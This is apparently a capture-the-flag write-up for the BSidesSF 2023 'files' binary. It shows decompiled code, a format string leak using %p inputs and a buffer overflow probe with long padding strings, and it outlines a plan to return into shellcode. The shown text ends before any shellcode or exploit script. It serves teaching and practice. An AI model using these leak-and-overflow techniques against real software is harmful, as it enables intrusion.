# Summary

Files is a binary exploitation challenge which allows a user to upload and download text files from a database. The `upload` command contains a format string vulnerability which can be used to leak a memory address of a user controlled buffer. The `download` command is vulnerable to a buffer overflow vulnerability since the downloaded file is placed into a buffer with a size of 1000 bytes but the maximum size of a file that can be uploaded is 2000 bytes. These two vulnerabilities together allow for remote code execution by first leaking a memory address with the `upload` command and uploading our payload, then downloading our payload and returning to the leaked memory address which stores our shellcode.

# Reverse Engineering

Launching the program, we can see that there is a prompt to enter a command. 

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ ./files
Please enter a valid command 
> help
Unkown command: help
Please enter a valid command 
> 
```

The `help` command doesn't seem to exist, so we're going to have to reverse engineer the binary to get a list of valid commands. A good start is to run the `strings` command on the binary and see if we can find any possible commands in the output.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ strings files
/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable

...

u+UH
Please enter a valid command 
%10000s
upload
download
exit
Unkown command: 
sqlite.db

...

```

Looking at the results, it looks like we have three commands: `upload`, `download`, and `exit`. The next step is to figure out how to supply the arguments. We'll do this using Ghidra.

We'll start by looking in the `main` function.

```c
1 undefined8 main(void)
2 
3 {
4   initDB();
5   processCommand();
6   return 0;
7 }
```

It appears that a database is initialized and then it starts listening for commands. Let's take a closer look at the `processCommand` function.

```c
 1 void processCommand(void)
 2 
 3 {
 4   int iVar1;
 5   char *pcVar2;
 6   long lVar3;
 7   undefined8 *puVar4;
 8   byte bVar5;
 9   undefined8 uStack104136;
10   undefined8 uStack104128;
11   undefined8 auStack104120 [248];
12   undefined8 uStack102136;
13   undefined8 uStack102128;
14   undefined8 auStack102120 [248];
15   undefined8 uStack100136;
16   undefined8 uStack100128;
17   undefined8 uStack100120;
18   undefined8 uStack100112;
19   undefined8 uStack100104;
20   undefined8 uStack100096;
21   undefined8 uStack100088;
22   undefined8 uStack100080;
23   undefined8 uStack100072;
24   undefined8 uStack100064;
25   undefined8 uStack100056;
26   undefined8 uStack100048;
27   undefined4 uStack100040;
28   undefined8 uStack100024;
29   undefined8 uStack100016;
30   undefined auStack100008 [100000];
31   
32   bVar5 = 0;
33   uStack100024 = 0;
34   uStack100016 = 0;
35   memset(auStack100008,0,0x18690);
36   uStack100136 = 0;
37   uStack100128 = 0;
38   uStack100120 = 0;
39   uStack100112 = 0;
40   uStack100104 = 0;
41   uStack100096 = 0;
42   uStack100088 = 0;
43   uStack100080 = 0;
44   uStack100072 = 0;
45   uStack100064 = 0;
46   uStack100056 = 0;
47   uStack100048 = 0;
48   uStack100040 = 0;
49   uStack102136 = 0;
50   uStack102128 = 0;
51   puVar4 = auStack102120;
52   for (lVar3 = 0xf8; lVar3 != 0; lVar3 = lVar3 + -1) {
53     *puVar4 = 0;
54     puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
55   }
56   uStack104136 = 0;
57   uStack104128 = 0;
58   puVar4 = auStack104120;
59   for (lVar3 = 0xf8; lVar3 != 0; lVar3 = lVar3 + -1) {
60     *puVar4 = 0;
61     puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
62   }
63   while (iVar1 = strcmp((char *)&uStack100136,"exit"), iVar1 != 0) {
64     puts("Please enter a valid command ");
65     printf("> ");
66     __isoc99_scanf("%10000s",&uStack100024);
67     pcVar2 = strtok((char *)&uStack100024,",");
68     strncpy((char *)&uStack100136,pcVar2,100);
69     pcVar2 = strtok((char *)0x0,",");
70     if (pcVar2 != (char *)0x0) {
71       strncpy((char *)&uStack102136,pcVar2,2000);
72       pcVar2 = strtok((char *)0x0,",");
73       if (pcVar2 != (char *)0x0) {
74         strncpy((char *)&uStack104136,pcVar2,2000);
75       }
76     }
77     iVar1 = strcmp((char *)&uStack100136,"upload");
78     if (iVar1 == 0) {
79       upload(&uStack102136,&uStack104136);
80     }
81     else {
82       iVar1 = strcmp((char *)&uStack100136,"download");
83       if (iVar1 == 0) {
84         download(&uStack102136);
85       }
86       else {
87         printUnknownCommand(&uStack100136);
88       }
89     }
90   }
91   return;
92 }
93 
```

We can see that just after the prompt is printed to the screen on line 64, a `scanf` call is made on line 66. The result is then passed to `strtok` on line 67. This means that the '`,`' symbol acts as the delimiter between arguments. The arguments are then copied into `uStack102136` and `uStack104136` on lines 71 and 74 respectively, which are later passed to either the `upload` function on line 79 or the `download` function on line 84. An important thing to note, 2000 characters are being read into these two stack variables, which means we can only upload files that are less than 2000 bytes.

Stepping into the upload function, we can see that `param_1` is passed as the only parameter to a call to `printf` on line 12.


```c
 1 void upload(char *param_1,char *param_2)
 2 
 3 {
 4   size_t sVar1;
 5   undefined8 local_28;
 6   undefined8 local_20;
 7   undefined4 local_14;
 8   char *local_10;
 9   
10   sqlite3_open("sqlite.db",&local_20);
11   printf("Uploading file with the following name: ");
12   printf(param_1);
13   putchar(10);
14   local_10 = "INSERT INTO files (name, data) VALUES (?, ?);";
15   local_14 = sqlite3_prepare_v2(local_20,"INSERT INTO files (name, data) VALUES (?, ?);",0xffffffff,
16                                 &local_28,0);
17   sVar1 = strlen(param_1);
18   local_14 = sqlite3_bind_text(local_28,1,param_1,sVar1 & 0xffffffff,0);
19   sVar1 = strlen(param_2);
20   local_14 = sqlite3_bind_blob(local_28,2,param_2,sVar1 & 0xffffffff,0);
21   local_14 = sqlite3_step(local_28);
22   local_14 = sqlite3_finalize(local_28);
23   sqlite3_close(local_20);
24   return;
25 }
```

If we recall, this parameter is one of the tokens from the string supplied by the user. Let's test this for a format string vulnerability. 

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ ./files
Please enter a valid command 
> upload,a%p,b%p
Uploading file with the following name: a0x5635948d30e0
Please enter a valid command 
> 
```

We can see that the format string specifier that we supplied was converted into a stack address. Since there's an '`a`' before the address, we know that it's the first parameter and based on the output that follows, we can assume that the first argument is the name and that the second in the data being uploaded. 

If we print multiple addresses we get some that are located on the stack.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ ./files
Please enter a valid command 
> upload,%p.%p.%p.%p.%p.%p.%p,AAAA
Uploading file with the following name: 0x55802843a0e0.(nil).(nil).0x7.0x558029887840.0x7fffc0148d60.0x7fffc0149530
Please enter a valid command 
> 
```

Let's do the same thing with GDB and see what those stack addresses point to.

```default
Please enter a valid command                                                                                                                      
> upload,%p.%p.%p.%p.%p.%p.%p,AAAA                                                                                                                
Uploading file with the following name: 0x5555555560e0.(nil).(nil).0x7.0x555555576840.0x7ffffffe4510.0x7ffffffe4ce0                               
Please enter a valid command                                                                                                                      
> ^C                                                                     
Program received signal SIGINT, Interrupt.

...

Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7d5d02d in __GI___libc_read (fd=0x0, buf=0x555555576d20, nbytes=0x400) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gdb-peda$ x/10x 0x7ffffffe4510
0x7ffffffe4510: 0x0000000041414141      0x0000000000000000
0x7ffffffe4520: 0x0000000000000000      0x0000000000000000
0x7ffffffe4530: 0x0000000000000000      0x0000000000000000
0x7ffffffe4540: 0x0000000000000000      0x0000000000000000
0x7ffffffe4550: 0x0000000000000000      0x0000000000000000
gdb-peda$ 

```

We can see that the sixth memory address returned is the address for the buffer containing our second argument. Examining lines 70-75 in the `processCommand` function, we see that the arguments which are passed to the `upload` function are only overwritten when a new value is provided. This means that when we use the `download` command and only include 1 argument, the argument containing the data from the previous upload will remain unchanged.

```c
 1 void processCommand(void)
 2 
 3 {
 4   int iVar1;
 5   char *pcVar2;
 6   long lVar3;
 7   undefined8 *puVar4;
 8   byte bVar5;
 9   undefined8 uStack104136;
10   undefined8 uStack104128;
11   undefined8 auStack104120 [248];
12   undefined8 uStack102136;
13   undefined8 uStack102128;
14   undefined8 auStack102120 [248];
15   undefined8 uStack100136;
16   undefined8 uStack100128;
17   undefined8 uStack100120;
18   undefined8 uStack100112;
19   undefined8 uStack100104;
20   undefined8 uStack100096;
21   undefined8 uStack100088;
22   undefined8 uStack100080;
23   undefined8 uStack100072;
24   undefined8 uStack100064;
25   undefined8 uStack100056;
26   undefined8 uStack100048;
27   undefined4 uStack100040;
28   undefined8 uStack100024;
29   undefined8 uStack100016;
30   undefined auStack100008 [100000];
31   
32   bVar5 = 0;
33   uStack100024 = 0;
34   uStack100016 = 0;
35   memset(auStack100008,0,0x18690);
36   uStack100136 = 0;
37   uStack100128 = 0;
38   uStack100120 = 0;
39   uStack100112 = 0;
40   uStack100104 = 0;
41   uStack100096 = 0;
42   uStack100088 = 0;
43   uStack100080 = 0;
44   uStack100072 = 0;
45   uStack100064 = 0;
46   uStack100056 = 0;
47   uStack100048 = 0;
48   uStack100040 = 0;
49   uStack102136 = 0;
50   uStack102128 = 0;
51   puVar4 = auStack102120;
52   for (lVar3 = 0xf8; lVar3 != 0; lVar3 = lVar3 + -1) {
53     *puVar4 = 0;
54     puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
55   }
56   uStack104136 = 0;
57   uStack104128 = 0;
58   puVar4 = auStack104120;
59   for (lVar3 = 0xf8; lVar3 != 0; lVar3 = lVar3 + -1) {
60     *puVar4 = 0;
61     puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
62   }
63   while (iVar1 = strcmp((char *)&uStack100136,"exit"), iVar1 != 0) {
64     puts("Please enter a valid command ");
65     printf("> ");
66     __isoc99_scanf("%10000s",&uStack100024);
67     pcVar2 = strtok((char *)&uStack100024,",");
68     strncpy((char *)&uStack100136,pcVar2,100);
69     pcVar2 = strtok((char *)0x0,",");
70     if (pcVar2 != (char *)0x0) {
71       strncpy((char *)&uStack102136,pcVar2,2000);
72       pcVar2 = strtok((char *)0x0,",");
73       if (pcVar2 != (char *)0x0) {
74         strncpy((char *)&uStack104136,pcVar2,2000);
75       }
76     }
77     iVar1 = strcmp((char *)&uStack100136,"upload");
78     if (iVar1 == 0) {
79       upload(&uStack102136,&uStack104136);
80     }
81     else {
82       iVar1 = strcmp((char *)&uStack100136,"download");
83       if (iVar1 == 0) {
84         download(&uStack102136);
85       }
86       else {
87         printUnknownCommand(&uStack100136);
88       }
89     }
90   }
91   return;
92 }
93 
```

```c
 1 undefined8 download(char *param_1)
 2 
 3 {
 4   size_t sVar1;
 5   long lVar2;
 6   undefined8 *puVar3;
 7   undefined8 local_418;
 8   undefined8 local_410;
 9   undefined8 local_408;
10   undefined8 local_400;
11   undefined8 local_3f8 [124];
12   char *local_18;
13   undefined4 local_c;
14   
15   local_408 = 0;
16   local_400 = 0;
17   puVar3 = local_3f8;
18   for (lVar2 = 0x7b; lVar2 != 0; lVar2 = lVar2 + -1) {
19     *puVar3 = 0;
20     puVar3 = puVar3 + 1;
21   }
22   local_410 = 0;
23   sqlite3_open("sqlite.db",&local_418);
24   local_c = sqlite3_prepare_v2(local_418,"SELECT data FROM files WHERE name=?;",0xffffffff,
25                                &local_410,0);
26   local_c = sqlite3_bind_text(local_410,1,param_1,0xffffffff,0);
27   local_c = sqlite3_step(local_410);
28   local_18 = (char *)sqlite3_column_blob(local_410,0);
29   strcpy((char *)&local_408,param_1);
30   sVar1 = strlen((char *)&local_408);
31   *(undefined4 *)((long)&local_408 + sVar1) = 0x202d20;
32   strcat((char *)&local_408,local_18);
33   fprintf(stdout,"%s\n",&local_408);
34   sqlite3_close(local_418);
35   return 1;
36 }
37 
38 
```

Looking at the `download` function, we can see that a SQL statement is prepared on line 24 which retrieves a the data of a file containing a specific name. The name is then bound to the statement on line 26 using the function parameter (which is controlled by an attacker). The result of that query is then written to the `local_408` buffer on line 32. So we know now that we can input arguments that are up to 2000 bytes long and one of those arguments gets written to the database and written back into a variable in the download `function`. Let's try to overflow one of those buffers with 2000 character payloads.

```default
┌─[kali@kali]-[~/Documents/CTF/BSidesSF2023/ctf-2023/challenges/files/distfiles]
└─━ [*]$ ./files
Please enter a valid command
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> Unkown command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Please enter a valid command
> upload,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Uploading file with the following name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAupload
Please enter a valid command 
> download,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA